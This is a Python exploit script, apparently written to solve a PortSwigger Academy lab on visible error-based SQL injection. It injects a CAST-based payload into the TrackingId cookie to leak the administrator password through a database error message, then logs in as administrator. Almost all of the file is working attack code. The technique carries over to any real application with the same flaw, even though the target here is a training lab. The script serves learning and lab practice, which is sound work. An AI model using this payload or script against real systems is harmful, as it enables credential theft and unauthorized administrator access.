# Visible error-based SQL injection

# https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

import sys
import requests
import urllib3
import urllib.parse
import re
import time
from bs4 import BeautifulSoup
import argparse


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_admin(s, url, password):
	print('\n[+] Trying to connect as administrator user with found password...')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	login_data = {
		'csrf': csrf_token,
		'username': 'administrator',
		'password': password
	}
	r = s.post(login_path, data=login_data)
	return r

def exploit_sqli(s, url, payload):
	r = s.get(url)
	time.sleep(1)
	session_cookie = s.cookies['session']
	print('\n[+] Found Session Cookie: %s' % session_cookie)
	print('[+] Using payload: %s' % payload)
	print('[+] Injecting in TrackingId Cookie...')
	cookies = {'session': session_cookie, 'TrackingId': payload}
	r = s.get(url, cookies=cookies)
	time.sleep(1)
	password = re.search('<p class=is-warning>ERROR: invalid input syntax for type integer: "(.*)"</p>', r.text).group(1)
	print('\n[+] Found Administrator Password: %s' % password)
	return password


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Visible error-based SQL injection')
	parser = argparse.ArgumentParser(description="[+] Lab: Visible error-based SQL injection")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Retrieving all products in the list (including non-released).\n')
			payload = "'||cast((select password from users limit 1) AS INT)--"

			password = exploit_sqli(s, url, payload)
			if password:
				print('\n[+] SQL Injection successful !')
				r = connect_as_admin(s, url, password)
				if r.status_code == 200 and 'Your username is: administrator' in r.text:
					print('[+] Logged in as Administrator user !')
					time.sleep(5)
					s.cookies.clear()
					s.headers.clear()
					r = s.get(url)
					if 'Congratulations, you solved the lab!' in r.text:
						print('[+] The lab is solved !')
			else:
				print('\n[-] SQL Injection Failed <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
